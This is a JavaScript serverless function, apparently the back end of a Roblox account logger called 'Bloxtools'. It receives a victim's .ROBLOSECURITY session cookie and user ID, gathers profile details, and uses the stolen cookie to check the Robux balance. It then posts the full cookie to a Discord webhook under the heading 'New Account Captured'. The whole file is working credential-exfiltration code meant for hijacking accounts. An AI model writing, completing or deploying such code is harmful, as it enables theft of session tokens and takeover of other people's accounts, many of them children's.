// api/submit.js – Vercel serverless function
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// Helper with timeout
async function fetchWithTimeout(url, options, timeout = 10000) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeout);
    try {
        const response = await fetch(url, { ...options, signal: controller.signal });
        clearTimeout(id);
        return response;
    } catch (err) {
        clearTimeout(id);
        throw err;
    }
}

async function fetchUserInfoFromId(userId) {
    try {
        // 1. Fetch basic user info (username, display name, join date, description, etc.)
        const userRes = await fetchWithTimeout(`https://users.roblox.com/v1/users/${userId}`, {}, 5000);
        if (!userRes.ok) return null;
        const userData = await userRes.json();

        // 2. Fetch friends count
        const friendsRes = await fetchWithTimeout(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {}, 5000);
        let friendsCount = "N/A";
        if (friendsRes.ok) {
            const friendsData = await friendsRes.json();
            friendsCount = friendsData.count?.toLocaleString() || "0";
        }

        // 3. (REMOVED) Fetch avatar items (wearing) - User requested removal
        // 4. (REMOVED) Fetch avatar thumbnail - Not requested

        // 5. NEW: Get user's creation date
        const createdAt = userData.created ? new Date(userData.created).toLocaleString() : "Unknown";

        // 6. NEW: Get user's "About Me" description
        const description = userData.description || "No description set.";

        // 7. Fetch premium status from new API
        let hasPremium = "Unknown";
        try {
            const premiumRes = await fetchWithTimeout(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {}, 5000);
            if (premiumRes.ok) {
                const premiumData = await premiumRes.json();
                // The API returns an object with a 'isPremium' property or similar.
                hasPremium = premiumData.isPremium === true ? "✅ Yes" : "❌ No";
            }
        } catch (premiumErr) {
            console.error("Premium check error:", premiumErr);
            hasPremium = "Error fetching";
        }

        // 8. Check if account is banned/terminated
        const isBanned = userData.isBanned ? "⚠️ Banned/Terminated" : "✅ Active";

        return {
            username: userData.name,
            displayName: userData.displayName,
            userId: userData.id,
            createdAt: createdAt,
            description: description,
            friendsCount: friendsCount,
            hasPremium: hasPremium,
            isBanned: isBanned,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (err) {
        console.error("fetchUserInfo error:", err);
        return null;
    }
}

async function fetchRobuxFromCookie(cookieValue) {
    try {
        const response = await fetchWithTimeout("https://economy.roblox.com/v1/user/currency", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
        }, 5000);
        if (!response.ok) return "N/A";
        const data = await response.json();
        return data.robux?.toLocaleString() || "0";
    } catch (e) {
        console.error("Robux fetch error:", e);
        return "N/A";
    }
}

async function sendToDiscordWebhook(cookie, rbxuid) {
    const userInfo = await fetchUserInfoFromId(rbxuid);
    const robux = await fetchRobuxFromCookie(cookie);

    const description = `
## 📦 Account Capture

- **rbxuid:** \`${rbxuid}\`
- **Cookie Length:** \`${cookie.length} chars\`

## 🔐 Full .ROBLOSECURITY Cookie
\`\`\`
${cookie}
\`\`\`
`;

    const embedFields = [];

    if (userInfo) {
        embedFields.push(
            {
                name: "👤 Roblox Profile",
                value: `**Username:** ${userInfo.username}\n**Display Name:** ${userInfo.displayName}\n**User ID:** ${userInfo.userId}\n**Account Created:** ${userInfo.createdAt}\n**Status:** ${userInfo.isBanned}\n**Description:** ${userInfo.description}\n\n🔗 [Profile](${userInfo.profileUrl})`,
                inline: false
            },
            { name: "👥 Friends", value: `${userInfo.friendsCount}`, inline: true },
            { name: "💰 Robux", value: `${robux} R$`, inline: true },
            { name: "✨ Premium Status", value: userInfo.hasPremium, inline: true }
        );
    } else {
        embedFields.push({
            name: "⚠️ Error",
            value: "Could not fetch public profile information.\nUser may be deleted, banned, or invalid.",
            inline: false
        });
    }

    embedFields.push({
        name: "🔐 Cookie Summary",
        value: `**Length:** ${cookie.length} characters\n**rbxuid:** ${rbxuid}`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 New Account Captured",
            description,
            color: 0x8c52ff,
            fields: embedFields,
            footer: { text: "Bloxtools • Roblox Account Logger" },
            timestamp: new Date().toISOString()
        }]
    };

    const response = await fetchWithTimeout(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }, 10000);

    if (!response.ok) {
        const errorText = await response.text();
        console.error("Discord webhook error:", response.status, errorText);
        return false;
    }
    return true;
}

module.exports = async (req, res) => {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ success: false, error: 'Method not allowed' });

    const { cookie, rbxuid } = req.body;
    if (!cookie || !rbxuid) {
        return res.status(400).json({ success: false, error: "Missing cookie or rbxuid" });
    }

    if (!WEBHOOK_URL) {
        console.error("WEBHOOK_URL environment variable missing");
        return res.status(500).json({ success: false, error: "Server configuration error" });
    }

    try {
        const success = await sendToDiscordWebhook(cookie, rbxuid);
        return res.json({ success });
    } catch (err) {
        console.error("Handler error:", err);
        return res.status(500).json({ success: false, error: "Internal server error" });
    }
};
